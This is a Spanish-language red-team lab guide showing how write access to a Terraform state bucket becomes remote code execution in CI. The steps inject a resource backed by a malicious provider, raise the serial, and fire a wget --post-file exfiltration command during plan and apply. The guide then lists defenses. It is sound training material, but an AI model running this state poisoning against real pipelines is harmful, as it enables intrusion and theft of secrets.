# 14 - Backdoor en el state de Terraform

**Clase 4 · 35 min · M5 Terraform (el ataque estrella del modulo)**
**Fase:** persistencia en IaC + ejecucion en el siguiente pipeline
**MITRE ATT&CK:** T1195.002 (Supply Chain), T1546 (Event Triggered Execution)
**Riesgo OWASP CI/CD:** CICD-SEC-9 (integridad del artefacto), CICD-SEC-5 (control de acceso del pipeline)

## Escenario

No tienes acceso al repo ni al runner. Solo tienes **escritura en el bucket
donde vive el state** (te la dio el lab 15). El state de Terraform es un JSON que
el pipeline lee en cada `plan` y `apply`. Si metes un recurso que no esta en el
codigo, Terraform intentara destruirlo: para ello cargara el provider que lo
gestiona, y ese provider puede ejecutar comandos.

Este es el ataque mas realista del modulo: permisos de escritura en un bucket
S3 se convierten en ejecucion remota en el CI, sin tocar el codigo.

## Objetivo de aprendizaje

- Entender que el state es una entrada no confiable del pipeline.
- Inyectar un recurso con un provider malicioso y subir el `serial`.
- Ver ejecucion en `plan` (lectura) y en `apply` (destruccion).
- Disenar la defensa: versionado, locking y auditoria del state.

## Requesitos

Stack arriba y el bucket `tfstate` creado por `make up`.

```bash
cd /home/ponciop/devops-redteam/lab/terraform/state
export AWS_ACCESS_KEY_ID=lab
export AWS_SECRET_ACCESS_KEY=lab
export AWS_DEFAULT_REGION=us-east-1
```

**Que esperar:** `../../../tools/aws s3 ls` muestra `tfstate` y
`prod-artifacts`.

## Paso 0 - Crear el state inicial (solo la primera vez)

Simula un pipeline que ya desplego algo:

```bash
../../../tools/tf init -input=false
../../../tools/tf apply -auto-approve -input=false
../../../tools/tf state list
```

**Que esperar:** `rce.deploy`. Si el state ya existe, puedes saltar este paso;
si `state list` pide `init`, ejecuta el `init`.

## Paso 1 - Descargar el state

```bash
../../../tools/aws s3 cp s3://tfstate/prod/terraform.tfstate ./orig.json
python3 -c 'import json;d=json.load(open("orig.json"));print("serial",d["serial"])'
```

**Que esperar:** `serial 1` (o el que corresponda). El `serial` es la version del
state; Terraform rechaza un state con un serial menor que el remoto.

## Paso 2 - Inyectar el recurso malicioso

```bash
python3 inject.py orig.json > tampered.json
python3 -c 'import json;d=json.load(open("tampered.json"));print([(r["type"],r["name"]) for r in d["resources"]])'
```

**Que esperar:**

```
[('rce', 'deploy'), ('rce', 'testing')]
```

El comando inyectado es:

```
wget -qO- --post-file=/hosthome/.devops-lab-tf-flag \
  http://localhost:8888/tf/state-backdoor >/dev/null
```

`inject.py` es idempotente: reemplaza `rce.testing` si ya existe y sube el
`serial` para que Terraform acepte el state.

## Paso 3 - Subir el state envenenado

```bash
../../../tools/aws s3 cp tampered.json s3://tfstate/prod/terraform.tfstate
```

**Que acabas de hacer:** es todo lo que el atacante necesita. No hay commit, no
hay PR, no hay acceso al runner. Solo un `PUT` en S3.

## Paso 4 - Disparar el plan

```bash
curl -s http://localhost:8888/__clear
../../../tools/tf plan -input=false
```

**Que esperar:**

```
# rce.testing will be destroyed
  - resource "rce" "testing" { ... }
Plan: 0 to add, 0 to change, 1 to destroy.
```

Y en hookcat:

```bash
curl -s http://localhost:8888/__requests \
  | python3 -c 'import sys,json;[print(x["path"],"|",x["body"]) for x in json.load(sys.stdin)]'
```

**Que esperar:** `POST /tf/state-backdoor | FLAG{terraform_state_backdoor}`.

**Por que se ejecuta en el plan:** para destruir `rce.testing`, Terraform tiene
que leer su estado actual con el provider. `terraform init` instala
`offensive-actions/statefile-rce` desde el registry publico, y el provider
ejecuta `attributes.command` en su `Read`. El dano ocurre antes de que el plan
termine.

## Paso 5 - Disparar el apply

```bash
curl -s http://localhost:8888/__clear
../../../tools/tf apply -auto-approve -input=false
../../../tools/tf state list
```

**Que esperar:** `1 destroyed`, otra peticion `/tf/state-backdoor` y
`rce.deploy` como unico recurso. El provider ejecuta el comando tambien en su
`Delete` y despues limpia el recurso del state.

## Paso 6 - Restaurar el entorno

El state ya esta limpio tras el apply. Borra los JSON de trabajo:

```bash
rm -f orig.json tampered.json
ls
```

**Que esperar:** solo `main.tf` e `inject.py`.

## Evidencia para el informe

- State original y envenenado (diff: recurso `rce.testing` y `serial`).
- Salida del plan con el `destroy` y la peticion `/tf/state-backdoor`.
- Salida del apply y `state list` final.
- Permiso exacto que basto: `s3:PutObject` sobre `tfstate/prod/`.
- Por que `init` en un pipeline efimero no alerta del provider nuevo.

## Checkpoint

1. Por que el plan ya ejecuta el comando, antes de aprobar nada?
2. Que dos campos del state hay que tocar para que Terraform lo acepte?
3. Por que el ataque es mas sigiloso que un commit en el repo?
4. Que pasa si el pipeline usa `-refresh=false`?

## Defensa

- Permisos del bucket: solo el rol del pipeline, lectura/escritura. Nada de
  escritura para humanos ni para otros servicios.
- State locking (DynamoDB o equivalente) y cifrado.
- Versionado del bucket y alertas cuando cambia el `serial` sin un run de CI.
- Auditar `resources`: cualquier tipo que no este en el codigo es una alerta.
- Bloquear providers no allowlisted (registry privado o `required_providers`
  fijado).
- Separar el state de produccion del de desarrollo.
- Revisar `terraform init` en cada run: un provider nuevo es sospechoso.

## Si algo falla

| Sintoma | Causa / arreglo |
|---|---|
| `Error loading state: serial` | estas subiendo un state con serial menor; usa `inject.py` |
| `Backend initialization required` | ejecuta `../../../tools/tf init -input=false` |
| No hay peticion en hookcat | revisa que `init` instalo el provider `rce` |
| `rce.testing` no aparece en el plan | el state subido no es el que lee el backend; revisa bucket/key |
| Queda basura tras el apply | `tf state rm rce.testing` y vuelve a aplicar |
